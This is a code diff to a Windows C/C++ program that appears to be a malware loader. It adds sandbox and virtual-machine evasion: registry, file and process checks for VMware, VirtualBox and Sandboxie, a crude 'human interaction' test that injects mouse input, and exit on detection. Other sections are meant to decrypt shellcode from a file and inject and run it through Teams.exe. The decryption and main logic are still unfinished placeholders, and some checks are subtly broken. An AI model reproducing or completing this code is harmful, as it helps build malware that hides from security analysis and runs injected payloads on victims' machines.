@@ -1,4 +1,5 @@
 #include <windows.h>
+#include <tlhelp32.h>
 
 // Constants
 #define PSIZE 1024
@@ -26,16 +27,142 @@ void checkMutex() {
     CloseHandle(hMutex);
 }
 
-// Function to evade ML and Sandboxing checks
+/*
+
+    Sandbox Evasion Section
+
+    NOTE: Do Not Use. It makes it hard to test. I just like to have the option avaiable. Plus we needed more code.
+
+*/
+
+
+// Function to evade sandboxing
 void stale() {
-    // Placeholder for your stale function logic...
+    // Check for known sandbox artifacts
+    if (isSandboxArtifactPresent()) {
+        ExitProcess(1); // Exit if sandbox artifacts are detected
+    }
+
+    // Check for human-like interaction
+    if (!isHumanInteractionPresent()) {
+        ExitProcess(1); // Exit if human-like interaction is not detected
+    }
+
+    // Mimic user behavior to evade sandbox analysis
+    mimicUserBehavior();
+
+    // Placeholder for additional sandbox evasion techniques...
+    // This may include various checks and delays to simulate normal user behavior.
 }
+
+
+// Sandbox artifact checks
+bool checkRegistryKey(const char* keyPath) {
+    HKEY hKey;
+    LONG result = RegOpenKeyExA(HKEY_LOCAL_MACHINE, keyPath, 0, KEY_READ, &hKey);
+    RegCloseKey(hKey);
+    return result == ERROR_SUCCESS;
+}
+
+bool checkFileExistence(const char* filePath) {
+    return GetFileAttributesA(filePath) != INVALID_FILE_ATTRIBUTES;
+}
+
+bool checkRunningProcesses(const char* processName) {
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe32;
+    pe32.dwSize = sizeof(PROCESSENTRY32);
+
+    if (Process32First(hSnap, &pe32)) {
+        do {
+            if (_stricmp(pe32.szExeFile, processName) == 0) {
+                CloseHandle(hSnap);
+                return true;
+            }
+        } while (Process32Next(hSnap, &pe32));
+    }
+
+    CloseHandle(hSnap);
+    return false;
+}
+
+
+// Human user detection
+bool isHumanInteractionPresent() {
+    // Check for mouse movement
+    INPUT input;
+    input.type = INPUT_MOUSE;
+    input.mi.dx = 1;
+    input.mi.dy = 1;
+    input.mi.dwFlags = MOUSEEVENTF_MOVE;
+    SendInput(1, &input, sizeof(INPUT));
+
+    // Check for keyboard input
+    SHORT keyState = GetAsyncKeyState(VK_SHIFT);
+    if (keyState == 0 || keyState == 1) {
+        // Shift key is pressed or released
+        return true;
+    }
+
+    // Check for window focus changes
+    HWND foregroundWindow = GetForegroundWindow();
+    if (foregroundWindow != NULL) {
+        CHAR windowTitle[256];
+        GetWindowTextA(foregroundWindow, windowTitle, sizeof(windowTitle));
+        
+        // Check if the window title is not empty (indicating potential user interaction)
+        if (strlen(windowTitle) > 0) {
+            return true;
+        }
+    }
+
+    // Placeholder for additional checks related to human-like interaction...
+
+    return false;
+}
+
+
+// Function to check sandbox artifacts
+bool isSandboxArtifactPresent() {
+    // Check for specific registry keys associated with sandboxes
+    if (checkRegistryKey("SOFTWARE\\VMware, Inc.\\VMware Tools") || checkRegistryKey("SOFTWARE\\Oracle\\VirtualBox")) {
+        return true;
+    }
+
+    // Check for specific files often present in sandboxes
+    if (checkFileExistence("C:\\sbiedll.dll") || checkFileExistence("C:\\\\BoxedAppSDK64.dll")) {
+        return true;
+    }
+
+    // Check for the presence of known sandbox processes
+    if (checkRunningProcesses("sandbox.exe") || checkRunningProcesses("vmware.exe")) {
+        return true;
+    }
+
+    return false;
+}
+
+
+/*
+
+    Encapsulation Section
+
+*/
+
+
 
 // Decrypt shellcode from file
 int decrypt_shellcode_from_file(char* payload, const char* path) {
-    // Placeholder for your decryption logic...
+    // TODO: Decryption logic and file read
     return 0; // Adjust return value as needed
 }
+
+
+/*
+
+    Injection and running section
+
+*/
 
 // Execute Teams.exe
 void execute_Teams() {
@@ -77,7 +204,8 @@ extern "C" {
 
 // Your main function or other parts of the program...
 int main() {
-    // Your existing main function logic...
+
+    // TODO: Write main statement
 
     return 0;
 }
